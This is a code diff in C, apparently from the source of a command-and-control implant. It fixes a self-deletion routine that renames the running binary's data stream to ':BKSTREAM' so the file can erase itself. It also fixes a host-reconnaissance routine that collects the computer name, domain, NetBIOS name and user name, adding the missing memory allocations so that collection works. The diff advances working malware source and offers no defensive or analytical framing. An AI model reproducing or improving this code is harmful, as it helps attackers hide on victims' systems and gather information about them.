@@ -122,13 +122,13 @@ FUNC BOOL SelfDeletion(
     BLACKOUT_INSTANCE
 
     FILE_DISPOSITION_INFORMATION Delete = { 0 };  
-    PFILE_RENAME_INFO            Rename = { 0 };
+    PFILE_RENAME_INFORMATION     Rename = { 0 };
 
     BOOL   bCheck    = FALSE;
     HANDLE hFile     = NULL;
     PCWSTR NewStream = L":BKSTREAM";
     UINT64 StreamLen = StringLengthW( NewStream ) * sizeof( WCHAR );
-    UINT64 RenameLen = sizeof( FILE_RENAME_INFO ) + StreamLen;
+    UINT64 RenameLen = sizeof( FILE_RENAME_INFORMATION ) + StreamLen;
 
     Rename = bkHeapAlloc( RenameLen );
 
@@ -234,14 +234,17 @@ FUNC VOID GetComputerInfo(
         PackageTransmitError( NtLastError() );
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
+        Instance()->System.ComputerName = bkHeapAlloc( CompTmpLen );
         Instance()->Win32.GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
     }
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
+        Instance()->System.DomainName = bkHeapAlloc( DomainLen );
         Instance()->Win32.GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
     }
 
     if ( !Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
+        Instance()->System.NetBios = bkHeapAlloc( NetBiosLen );
         Instance()->Win32.GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
     }
 
@@ -255,6 +258,7 @@ FUNC VOID GetComputerInfo(
         }
     }
 
+    Instance()->System.UserName = bkHeapAlloc( UserTmpLen );
     Instance()->Win32.GetUserNameA( Instance()->System.UserName, &UserTmpLen );
     
     *ProcessArch  = SysInf.wProcessorArchitecture;
